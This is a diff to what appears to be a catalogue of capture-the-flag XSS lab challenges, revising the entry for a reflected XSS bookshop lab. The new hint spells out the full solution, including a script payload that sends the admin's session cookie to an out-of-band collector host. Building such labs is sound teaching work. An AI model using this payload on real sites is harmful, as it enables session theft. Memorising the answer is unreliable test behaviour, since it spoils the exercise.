@@ -568,9 +568,9 @@
         "slug": "reflected-xss-search-noescape",
         "title": "Reflected XSS in Search Results",
         "difficulty": "apprentice",
-        "description": "A vintage-styled bookshop echoes the ?q= query parameter directly into the search-results heading with no HTML escaping. A visitor bot polls any URL you submit through the /report form every 20 seconds while carrying the admin's session cookie, providing a controllable delivery target for a first payload.",
-        "objective": "Craft a URL that, when visited by the admin bot, causes the admin's document.cookie value (specifically the 'session' cookie) to arrive at the out-of-band collector listening on http://collector:9000/report?c=... on the shared docker network.",
-        "flag_hint": "The OOB collector container logs every /report?c=... request; when the value of c= matches the admin session cookie currently issued by the app, the app's /solve endpoint returns the flag string. The flag is also written to /flag.txt inside the collector container for direct exec inspection.",
+        "description": "A vintage-styled bookshop echoes the ?q= query parameter directly into the search-results heading with no HTML escaping. A headless-Chromium admin bot visits any path you submit through the /report form every couple of seconds while carrying the admin's non-HttpOnly session cookie, providing a controllable delivery target for a first payload.",
+        "objective": "Craft a URL that, when visited by the admin bot, causes the admin's document.cookie value (specifically the 'session' cookie) to arrive at the out-of-band collector listening on http://collector:9000/report?c=... on the internal, egress-dropped docker network.",
+        "flag_hint": "Submit /?q=<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script> to POST /report; read the exfiltrated cookie via the app proxy GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"} and the app returns the HMAC flag when it matches the admin session.",
         "skills_taught": [
           "identifying reflected sinks",
           "constructing basic <script> payloads",
@@ -579,13 +579,13 @@
         ],
         "tech_stack": [
           "Python 3.12",
-          "Flask 3.0",
-          "Jinja2 3.1 (autoescape disabled on the search template)",
-          "nginx 1.27 reverse proxy",
-          "Puppeteer 22 headless-Chrome admin bot",
-          "Node 20 OOB collector on port 9000"
+          "Flask 3.1",
+          "gunicorn 23",
+          "Jinja2 (autoescape disabled on the search render)",
+          "@websec-lab/xss-verifier headless-Chromium bot",
+          "stdlib OOB collector"
         ],
-        "inspired_by": "the canonical PortSwigger 'Reflected XSS into HTML context' lab pattern, abstracted for local Docker use"
+        "inspired_by": "the canonical PortSwigger 'Reflected XSS into HTML context' lab pattern, abstracted for local Docker with a Playwright victim bot and an OOB collector"
       },
       {
         "slug": "stored-xss-comment-plain",
